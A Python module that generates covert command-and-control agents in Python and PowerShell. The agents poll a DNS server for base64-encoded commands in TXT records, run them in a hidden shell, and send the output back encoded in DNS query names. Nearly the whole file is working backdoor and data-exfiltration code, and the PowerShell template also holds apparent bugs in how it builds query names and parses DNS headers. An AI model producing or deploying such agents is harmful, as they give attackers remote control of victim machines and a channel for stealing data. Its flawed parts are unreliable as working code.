#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Minimal DNS TXT polling agent helpers (stdlib UDP) for reverse DNS C2."""

from __future__ import annotations


def build_python_dns_agent_script(
    domain: str,
    client_id: str,
    dns_server: str,
    dns_port: int,
    poll_interval: float = 5.0,
    *,
    chunk_label_chars: int = 50,
) -> str:
    """Return a self-contained Python agent compatible with listeners/covert/dns.

    Protocol:
      poll   poll.<client_id>.<domain>  -> TXT base64(command) or "wait"
      result result.<b64url_chunk>.<client_id>.<domain>  (urlsafe b64, no padding)
    """
    dom = str(domain or "c2.local").strip().rstrip(".")
    cid = str(client_id or "dns1").strip()
    srv = str(dns_server or "127.0.0.1").strip()
    port = int(dns_port or 53)
    interval = float(poll_interval or 5.0)
    chunk_sz = max(16, min(int(chunk_label_chars or 50), 62))

    return f"""
import base64,os,random,socket,struct,subprocess,time
DOMAIN={dom!r}; CID={cid!r}; NS={srv!r}; PORT={int(port)}; INTERVAL={interval}; CHUNK={chunk_sz}

def _enc_name(name):
  out=b''
  for part in name.strip('.').split('.'):
    b=part.encode('ascii','replace')[:63]
    out+=bytes([len(b)])+b
  return out+b'\\x00'

def _dec_name(data, off):
  labels=[]
  jumped=False; start=off; steps=0
  while off < len(data) and steps < 128:
    steps+=1
    ln=data[off]
    if ln==0:
      off+=1; break
    if (ln & 0xC0)==0xC0:
      if off+1>=len(data): break
      ptr=((ln & 0x3F)<<8)|data[off+1]
      if not jumped: start=off+2
      off=ptr; jumped=True; continue
    off+=1
    labels.append(data[off:off+ln].decode('ascii','replace'))
    off+=ln
  return '.'.join(labels), (start if jumped else off)

def _build_query(qname, qtype=16):
  tid=random.randint(0,65535)
  hdr=struct.pack('!HHHHHH', tid, 0x0100, 1, 0, 0, 0)
  return hdr+_enc_name(qname)+struct.pack('!HH', qtype, 1)

def _skip_name(data, off):
  _, off=_dec_name(data, off)
  return off

def _parse_txt(data):
  if len(data)<12: return []
  qd=struct.unpack('!H', data[4:6])[0]
  an=struct.unpack('!H', data[6:8])[0]
  off=12
  for _ in range(qd):
    off=_skip_name(data, off)
    off+=4
  out=[]
  for _ in range(an):
    off=_skip_name(data, off)
    if off+10>len(data): break
    rtype,rclass,ttl,rdlen=struct.unpack('!HHIH', data[off:off+10])
    off+=10
    rdata=data[off:off+rdlen]; off+=rdlen
    if rtype!=16: continue
    pos=0; parts=[]
    while pos < len(rdata):
      ln=rdata[pos]; pos+=1
      parts.append(rdata[pos:pos+ln]); pos+=ln
    if parts:
      out.append(b''.join(parts).decode('utf-8','replace'))
  return out

def _dns_query(qname, qtype=16, timeout=8.0):
  pkt=_build_query(qname, qtype)
  s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  try:
    s.settimeout(timeout)
    s.sendto(pkt, (NS, PORT))
    data,_=s.recvfrom(4096)
  finally:
    try: s.close()
    except Exception: pass
  return _parse_txt(data)

def _run(cmd):
  try:
    p=subprocess.run(cmd, shell=True, capture_output=True, timeout=120)
    out=(p.stdout or b'')+(p.stderr or b'')
    if not out: out=('exit %s\\n'%p.returncode).encode()
    return out.decode('utf-8','replace')
  except Exception as e:
    return 'ERROR:%s'%e

def _b64url_nopad(raw):
  return base64.urlsafe_b64encode(raw).decode('ascii').rstrip('=')

def _poll():
  qname='poll.'+CID+'.'+DOMAIN
  txts=_dns_query(qname, 16)
  if not txts: return ''
  txt=txts[0].strip()
  if not txt or txt.lower()=='wait': return ''
  try:
    return base64.b64decode(txt).decode('utf-8','replace')
  except Exception:
    return txt

def _send_result(text):
  raw=text.encode('utf-8','replace')
  enc=_b64url_nopad(raw)
  for i in range(0, len(enc) or 1, CHUNK):
    chunk=enc[i:i+CHUNK] or 'AA'
    qname='result.'+chunk+'.'+CID+'.'+DOMAIN
    try: _dns_query(qname, 16, timeout=6.0)
    except Exception: pass

while True:
  try:
    cmd=_poll()
    if cmd and str(cmd).strip():
      out=_run(str(cmd))
      _send_result(out)
  except Exception:
    pass
  time.sleep(max(0.5, INTERVAL))
""".strip()


def build_powershell_dns_agent_script(
    domain: str,
    client_id: str,
    dns_server: str,
    dns_port: int,
    poll_interval: float = 5.0,
    *,
    chunk_label_chars: int = 50,
) -> str:
    """Return PowerShell source for a DNS TXT polling agent (listeners/covert/dns)."""
    dom = str(domain or "c2.local").strip().rstrip(".")
    cid = str(client_id or "dns1").strip()
    srv = str(dns_server or "127.0.0.1").strip()
    port = int(dns_port or 53)
    interval = float(poll_interval or 5.0)
    chunk_sz = max(16, min(int(chunk_label_chars or 50), 62))

    def esc(s: str) -> str:
        return str(s or "").replace("'", "''")

    return f"""
$ErrorActionPreference='SilentlyContinue'
$DOMAIN='{esc(dom)}'
$CID='{esc(cid)}'
$NS='{esc(srv)}'
$PORT=[int]{port}
$INTERVAL=[double]{interval}
$CHUNK=[int]{chunk_sz}

function Enc-Name([string]$name){{
  $bytes=New-Object Collections.Generic.List[byte]
  foreach($part in $name.Trim('.').Split('.')){{
    $p=[Text.Encoding]::ASCII.GetBytes($part)
    if($p.Length -gt 63){{ $p=$p[0..62] }}
    $bytes.Add([byte]$p.Length)|Out-Null
    foreach($b in $p){{ $bytes.Add($b)|Out-Null }}
  }}
  $bytes.Add(0)|Out-Null
  return [byte[]]$bytes.ToArray()
}}
function Dec-Name([byte[]]$data,[int]$off){{
  $labels=New-Object Collections.Generic.List[string]
  $jumped=$false; $start=$off; $steps=0
  while($off -lt $data.Length -and $steps -lt 128){{
    $steps++
    $ln=$data[$off]
    if($ln -eq 0){{ $off++; break }}
    if(($ln -band 0xC0) -eq 0xC0){{
      if($off+1 -ge $data.Length){{ break }}
      $ptr=(($ln -band 0x3F) -shl 8) -bor $data[$off+1]
      if(-not $jumped){{ $start=$off+2 }}
      $off=$ptr; $jumped=$true; continue
    }}
    $off++
    $labels.Add([Text.Encoding]::ASCII.GetString($data,$off,$ln))|Out-Null
    $off+=$ln
  }}
  $end=if($jumped){{ $start }} else {{ $off }}
  return @([string]::Join('.',$labels), $end)
}}
function Skip-Name([byte[]]$data,[int]$off){{
  $r=Dec-Name $data $off; return [int]$r[1]
}}
function Build-Query([string]$qname,[int]$qtype=16){{
  $tid=Get-Random -Minimum 0 -Maximum 65536
  $hdr=[BitConverter]::GetBytes([uint16]$tid)+[BitConverter]::GetBytes([uint16]0x0100)+[BitConverter]::GetBytes([uint16]1)+([byte[]](0,0,0,0,0,0))
  [Array]::Reverse($hdr,0,2); [Array]::Reverse($hdr,2,2); [Array]::Reverse($hdr,4,2)
  $body=Enc-Name $qname
  $qt=[BitConverter]::GetBytes([uint16]$qtype)+[BitConverter]::GetBytes([uint16]1)
  [Array]::Reverse($qt,0,2); [Array]::Reverse($qt,2,2)
  return $hdr+$body+$qt
}}
function Parse-Txt([byte[]]$data){{
  if($data.Length -lt 12){{ return @() }}
  $qd=[BitConverter]::ToUInt16($data[4..5],0)
  $an=[BitConverter]::ToUInt16($data[6..7],0)
  $off=12
  for($i=0;$i -lt $qd;$i++){{ $off=Skip-Name $data $off; $off+=4 }}
  $out=New-Object Collections.Generic.List[string]
  for($i=0;$i -lt $an;$i++){{
    $off=Skip-Name $data $off
    if($off+10 -gt $data.Length){{ break }}
    $rtype=[BitConverter]::ToUInt16($data[$off..($off+1)],0)
    $rdlen=[BitConverter]::ToUInt16($data[($off+8)..($off+9)],0)
    $off+=10
    $rdata=$data[$off..($off+$rdlen-1)]; $off+=$rdlen
    if($rtype -ne 16){{ continue }}
    $pos=0; $parts=New-Object Collections.Generic.List[byte]
    while($pos -lt $rdata.Length){{
      $ln=$rdata[$pos]; $pos++
      if($ln -gt 0){{ $parts.AddRange($rdata[$pos..($pos+$ln-1)]) }}
      $pos+=$ln
    }}
    if($parts.Count -gt 0){{ $out.Add([Text.Encoding]::UTF8.GetString([byte[]]$parts.ToArray()))|Out-Null }}
  }}
  return $out.ToArray()
}}
function Dns-Query([string]$qname,[int]$qtype=16,[double]$timeout=8){{
  $pkt=Build-Query $qname $qtype
  $udp=New-Object Net.Sockets.UdpClient
  try {{
    $udp.Client.ReceiveTimeout=[int]($timeout*1000)
    [void]$udp.Send($pkt,$pkt.Length,$NS,$PORT)
    $ep=New-Object Net.IPEndPoint([Net.IPAddress]::Any,0)
    $data=$udp.Receive([ref]$ep)
    return Parse-Txt ([byte[]]$data)
  }} finally {{ try{{ $udp.Close() }} catch{{}} }}
}}
function Run-Cmd([string]$cmd){{
  try {{
    $psi=New-Object Diagnostics.ProcessStartInfo
    $psi.FileName='cmd.exe'
    $psi.Arguments='/c '+$cmd
    $psi.RedirectStandardOutput=$true
    $psi.RedirectStandardError=$true
    $psi.UseShellExecute=$false
    $psi.CreateNoWindow=$true
    $p=[Diagnostics.Process]::Start($psi)
    $out=$p.StandardOutput.ReadToEnd()+$p.StandardError.ReadToEnd()
    $p.WaitForExit(120000)|Out-Null
    if(-not $out){{ $out='[exit '+$p.ExitCode+']' }}
    return $out
  }} catch {{ return 'ERROR:'+$_.Exception.Message }}
}}
function B64Url([byte[]]$raw){{
  $s=[Convert]::ToBase64String($raw).TrimEnd('=').Replace('+','-').Replace('/','_')
  return $s
}}
function Poll-Cmd(){{
  $q='poll.'+$CID+'.'+DOMAIN
  $txts=Dns-Query $q 16
  if(-not $txts -or $txts.Count -eq 0){{ return '' }}
  $txt=[string]$txts[0]
  if(-not $txt -or $txt.ToLower() -eq 'wait'){{ return '' }}
  try {{
    $pad=$txt.Length % 4
    if($pad){{ $txt=$txt+('='*(4-$pad)) }}
    return [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($txt))
  }} catch {{ return $txt }}
}}
function Send-Result([string]$text){{
  $raw=[Text.Encoding]::UTF8.GetBytes([string]$text)
  $enc=B64Url $raw
  if(-not $enc){{ $enc='AA' }}
  for($i=0;$i -lt $enc.Length;$i+=$CHUNK){{
    $chunk=$enc.Substring($i,[Math]::Min($CHUNK,$enc.Length-$i))
    if(-not $chunk){{ $chunk='AA' }}
    $q='result.'+$chunk+'.'+$CID+'.'+DOMAIN
    try {{ [void](Dns-Query $q 16 6) }} catch {{}}
  }}
}}
while($true){{
  try {{
    $cmd=Poll-Cmd
    if($cmd -and $cmd.Trim()){{
      $out=Run-Cmd $cmd
      Send-Result $out
    }}
  }} catch {{}}
  Start-Sleep -Seconds ([Math]::Max(0.5,$INTERVAL))
}}
""".strip()
